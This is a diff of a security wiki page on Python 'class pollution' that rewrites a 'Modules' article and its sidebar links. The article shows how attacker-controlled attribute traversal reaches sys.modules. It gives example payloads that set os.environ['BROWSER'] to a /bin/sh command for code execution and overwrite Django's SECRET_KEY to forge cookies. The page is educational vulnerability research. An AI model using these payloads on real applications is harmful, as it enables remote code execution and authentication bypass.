@@ -14,22 +14,23 @@
     <div class="wiki-layout">
         <nav class="sidebar">
             <div class="sidebar-header">
-                <a href="/">Class Pollution Wiki</a>
+                <a href="/wiki/docs/">Class Pollution Wiki</a>
             </div>
             <ul class="sidebar-nav">
 
 
+    <li>
+        <a href="/wiki/docs/" >Overview</a>
+    </li>
     
     <li>
         <a href="/wiki/docs/taxonomy/" >Taxonomy</a>
         
         <ul>
             
+            <li><a href="/wiki/docs/taxonomy/atomics/" >Get &amp; Set Atomics</a></li>
+            
             <li><a href="/wiki/docs/taxonomy/primitives/" >Pollution Primitives</a></li>
-            
-            <li><a href="/wiki/docs/taxonomy/types/" >Vulnerability Types</a></li>
-            
-            <li><a href="/wiki/docs/taxonomy/consequences/" >Consequences</a></li>
             
         </ul>
         
@@ -59,9 +60,9 @@
             
             <li><a href="/wiki/docs/gadgets/xss/" >XSS Gadgets</a></li>
             
-            <li><a href="/wiki/docs/gadgets/dos/" >DoS Gadgets</a></li>
-            
             <li><a href="/wiki/docs/gadgets/auth-bypass/" >Auth Bypass Gadgets</a></li>
+            
+            <li><a href="/wiki/docs/gadgets/dos/" >DoS Gadgets</a></li>
             
         </ul>
         
@@ -85,7 +86,7 @@
         
         <ul>
             
-            <li><a href="/wiki/docs/collection/showcases/" >Showcases</a></li>
+            <li><a href="/wiki/docs/collection/showcases/" >Showcases &amp; CVEs</a></li>
             
         </ul>
         
@@ -96,32 +97,6 @@
         
     </li>
     
-    <li>
-        <a href="/wiki/docs/reference/" >Reference</a>
-        
-        <ul>
-            
-            <li><a href="/wiki/docs/reference/cve-index/" >CVE Index</a></li>
-            
-        </ul>
-        
-    </li>
-    
-    <li>
-        <a href="/wiki/docs/faq/" >FAQ</a>
-        
-    </li>
-    
-    <li>
-        <a href="/wiki/docs/history/" >History</a>
-        
-    </li>
-    
-    <li>
-        <a href="/wiki/docs/getting-started/" >Getting Started</a>
-        
-    </li>
-    
 
 </ul>
 
@@ -129,55 +104,51 @@
         <main class="content">
             
 <article>
-    <h1 id="module-pollution-target">Module Pollution Target</h1>
-<p>When a module <code>mod</code> is accessible, the attacker controls global variables used across modules. Module-level pollution is powerful because global variables are shared by all code that imports from that module.</p>
-<h2 id="access-mechanism-global-variable-reference">Access Mechanism: Global Variable Reference</h2>
-<p>Python modules use a global namespace (a dictionary) to store module-level variables. When code does <code>from mod import v</code> or <code>mod.v</code>, it reads from this namespace.</p>
+    <h1 id="modules">Modules</h1>
+<p>When a module <code>mod</code> is accessible, the attacker can modify any of its module-level globals. Module pollution is powerful because module globals are shared across every importer.</p>
+<h2 id="access-mechanism-global-variable-reference">Access mechanism: global variable reference</h2>
+<p>A Python module&rsquo;s global namespace is a dictionary on the module object. Reads such as <code>from mod import v</code> or <code>mod.v</code> resolve to entries in that dictionary, so writing to <code>mod.__dict__[&quot;v&quot;]</code> or <code>mod.v</code> changes what every importer sees.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># mod.py</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">f</span>():
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> v
-</span></span><span style="display:flex;"><span>    v <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;safe&#34;</span>
+</span></span><span style="display:flex;"><span>    v               <span style="color:#75715e"># attacker controls the global variable</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># other.py</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> mod <span style="color:#f92672">import</span> v   <span style="color:#75715e"># Reads mod.__dict__[&#39;v&#39;]</span>
-</span></span><span style="display:flex;"><span>print(v)            <span style="color:#75715e"># → &#34;safe&#34;</span>
-</span></span></code></pre></div><h2 id="loading-context">Loading Context</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># mod.py</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">f</span>(): <span style="color:#66d9ef">global</span> v; v    <span style="color:#75715e"># Attacker controls the global variable</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># other.py</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> mod <span style="color:#f92672">import</span> v; v    <span style="color:#75715e"># Used across modules</span>
-</span></span></code></pre></div><h2 id="how-to-reach-modules">How to Reach Modules</h2>
-<p>Modules are accessible through:</p>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> mod <span style="color:#f92672">import</span> v   <span style="color:#75715e"># reads mod.__dict__[&#34;v&#34;]</span>
+</span></span><span style="display:flex;"><span>v                   <span style="color:#75715e"># the polluted value is used here</span>
+</span></span></code></pre></div><h2 id="how-to-reach-a-module">How to reach a module</h2>
+<p>Modules are accessible through three routes.</p>
 <ol>
-<li><strong><code>sys.modules</code></strong> — The global module cache containing all loaded modules</li>
-<li><strong><code>f.__globals__</code></strong> — Any function carries a reference to its defining module&rsquo;s <code>__dict__</code></li>
-<li><strong>Direct attribute access</strong> — If the module object is reachable via traversal</li>
+<li><strong><code>sys.modules</code></strong>. The global module cache contains every loaded module by name. Reaching <code>sys.modules</code> once means reaching <code>os</code>, <code>subprocess</code>, <code>django.conf</code>, and anything else the application has imported.</li>
+<li><strong><code>f.__globals__</code></strong>. Every function carries a reference to its defining module&rsquo;s <code>__dict__</code>. Any traversal that passes through a function reaches that function&rsquo;s module globals (covered on the <a href="/wiki/docs/targets/functions/">Functions</a> page).</li>
+<li><strong>Direct attribute access</strong>. If the attacker&rsquo;s traversal already holds the module object as a value, attribute access on it lands directly in the module&rsquo;s globals.</li>
 </ol>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Reaching sys.modules from any object:</span>
-</span></span><span style="display:flex;"><span>obj<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span><span style="color:#a6e22e">__init__</span><span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#39;sys&#39;</span>]<span style="color:#f92672">.</span>modules
+</span></span><span style="display:flex;"><span>obj<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span><span style="color:#a6e22e">__init__</span><span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#34;sys&#34;</span>]<span style="color:#f92672">.</span>modules
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Or via __globals__ directly:</span>
-</span></span><span style="display:flex;"><span>obj<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span><span style="color:#a6e22e">__init__</span><span style="color:#f92672">.</span>__globals__  <span style="color:#75715e"># → module&#39;s namespace</span>
-</span></span></code></pre></div><h2 id="example-polluting-environment-variables">Example: Polluting Environment Variables</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Traversal to os.environ:</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># __class__.__init__.__globals__.sys.modules.os.environ</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Or stepping into a single module&#39;s globals via any of its functions:</span>
+</span></span><span style="display:flex;"><span>obj<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span><span style="color:#a6e22e">__init__</span><span style="color:#f92672">.</span>__globals__   <span style="color:#75715e"># the defining module&#39;s namespace</span>
+</span></span></code></pre></div><h3 id="example-polluting-osenviron-for-rce">Example: polluting <code>os.environ</code> for RCE</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> webbrowser
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># After pollution: os.environ[&#34;BROWSER&#34;] = &#34;/bin/sh -c &#39;malicious command&#39;&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> antigravity  <span style="color:#75715e"># Triggers webbrowser → reads BROWSER → RCE</span>
-</span></span></code></pre></div><h2 id="example-polluting-django-settings">Example: Polluting Django Settings</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Traversal to Django&#39;s SECRET_KEY:</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># __init__.__globals__.sys.modules.django.conf.settings.SECRET_KEY</span>
+</span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>environ<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;BROWSER&#34;</span>)           <span style="color:#75715e"># returns whatever the user set, e.g. &#34;firefox&#34;</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># After pollution: SECRET_KEY = &#34;attacker_known_value&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># → Attacker can forge session cookies → authentication bypass</span>
-</span></span></code></pre></div><h2 id="why-module-pollution-is-powerful">Why Module Pollution Is Powerful</h2>
-<ol>
-<li><strong>Global scope</strong>: Module variables are shared across the entire application</li>
-<li><strong>Cross-module impact</strong>: Polluting one module affects all importers</li>
-<li><strong>Standard library</strong>: Critical modules like <code>os</code>, <code>sys</code>, <code>subprocess</code> are always loaded</li>
-<li><strong>No instance required</strong>: Unlike class pollution, module pollution doesn&rsquo;t need multiple instances</li>
-</ol>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Attacker payload (Item-Set on os.environ via __class__.__init__.__globals__):</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#   os.environ[&#34;BROWSER&#34;] = &#34;/bin/sh -c &#39;id &gt; /tmp/pwned&#39;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> antigravity                  <span style="color:#75715e"># calls webbrowser.open(), which now executes the shell command</span>
+</span></span></code></pre></div><h3 id="example-polluting-djangoconfsettingssecret_key-for-auth-bypass">Example: polluting <code>django.conf.settings.SECRET_KEY</code> for auth bypass</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> django.conf <span style="color:#f92672">import</span> settings
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> django.core.signing <span style="color:#f92672">import</span> Signer
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Signer()<span style="color:#f92672">.</span>sign(<span style="color:#e6db74">&#34;payload&#34;</span>)            <span style="color:#75715e"># signs with the real, unknown SECRET_KEY</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Attacker payload (Attr-Set on settings via __init__.__globals__[&#34;sys&#34;].modules[&#34;django.conf&#34;]):</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#   settings.SECRET_KEY = &#34;attacker_known_value&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Signer()<span style="color:#f92672">.</span>sign(<span style="color:#e6db74">&#34;payload&#34;</span>)            <span style="color:#75715e"># signs with the attacker&#39;s known key, so the attacker can forge cookies</span>
+</span></span></code></pre></div><p>Both patterns are detailed on the <a href="/wiki/docs/gadgets/rce/">RCE gadgets</a> and <a href="/wiki/docs/gadgets/auth-bypass/">authentication bypass gadgets</a> pages.</p>
 
 </article>
 
